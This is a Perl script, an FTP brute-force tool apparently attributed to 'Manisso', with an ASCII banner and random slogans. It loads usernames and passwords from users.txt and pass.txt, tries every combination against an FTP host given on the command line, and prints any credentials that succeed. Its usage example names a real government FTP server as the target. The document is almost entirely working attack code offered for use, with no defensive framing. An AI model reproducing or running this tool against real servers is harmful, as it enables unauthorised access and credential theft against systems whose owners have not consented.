#!/usr/bin/perl

use Net::FTP;
use Term::ANSIColor;

my @c = ("\033[0;30m", "\033[1;30m", "\033[0;31m", "\033[0;32m", "\033[0;33m", "\033[1;33m", "\033[0;34m", "\033[0;35m", "\033[0;36m", "\033[1;36m", "\033[0;37m", "\033[1;37m", "\033[1;34m");
my @ESLOGAN=("A day without laughter is a day wasted", "Virgin!! life will fuck us all!", "Life is really simple, but we insist on making it complicated.", "We do not remember days, we remember moments.", "Be the Change That You Wish To See In The World", "! Keep Calm And love me !", "You look better today !", "Float like a butterfly, sting like a bee.", "If it were not for hopes, the heart would break.","Say 1.2.3 viva l'Algerie");

system('clear');
system('clear');
system('clear');
system('clear');
system('clear');
system('clear');
system('clear');
system('clear');
system('clear');
system('clear');
system('cls');
system(' FTP Brut Force');
system "color c";
print "
███╗   ███╗ █████╗ ███╗   ██╗██╗███████╗███████╗ ██████╗
████╗ ████║██╔══██╗████╗  ██║██║██╔════╝██╔════╝██╔═══██╗
██╔████╔██║███████║██╔██╗ ██║██║███████╗███████╗██║   ██║
██║╚██╔╝██║██╔══██║██║╚██╗██║██║╚════██║╚════██║██║   ██║
██║ ╚═╝ ██║██║  ██║██║ ╚████║██║███████║███████║╚██████╔╝
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚══════╝╚══════╝ ╚═════╝ 
▀▀█▀▀ █▀▀█ █▀▀█ █   █▀▀ ~ FTP Brute Forcer By Ⓜ Ⓐ Ⓝ Ⓘ Ⓢ Ⓢ Ⓞ  ☪ ~
  █   █  █ █  █ █   ▀▀█ 
  ▀   ▀▀▀▀ ▀▀▀▀ ▀▀▀ ▀▀▀ 
                 
$c[2] #$ESLOGAN[rand @ESLOGAN] $c[11]                                               
                                               ";

print "\n";


$host=$ARGV[0]|| die
"\n USE: xftp <host>\n Ex: root@ root#: xftp ftp.ornl.gov \n";
 
print color 'bold blue';
open(USUARIOS,"< ./users.txt") or die "users.txt not found\n";
chomp(my @user = <USUARIOS>);
 

open(SENHAS,"< ./pass.txt") or die "pass.txt not found\n";
chomp(my @passs = <SENHAS>);
 

foreach(sort @user){  
foreach my $pass (sort @passs){  
 

my $f = Net::FTP->new("$host",
                Debug => 1,
                Passive=>0) or die "[✘] FTP Server Fail Connection ◎ [✘]\n";
 

if ($f->login($_,$pass)){
print "\t\n";
print color 'bold green';
print "[✔]FTP BRUTE-FORCE SUCCCESS ◉ [✔]\n\n";
print color 'reset';
print color 'bold red';
print "[✔] ◉ FTP-server: $host [✔]\n";
print "[✔] ◉ FTP-User: $_ [✔]\n";
print "[✔] ◉ FTP-Pass: $pass [✔]\n";
print color 'reset';
print "\n\n";
}
}
}
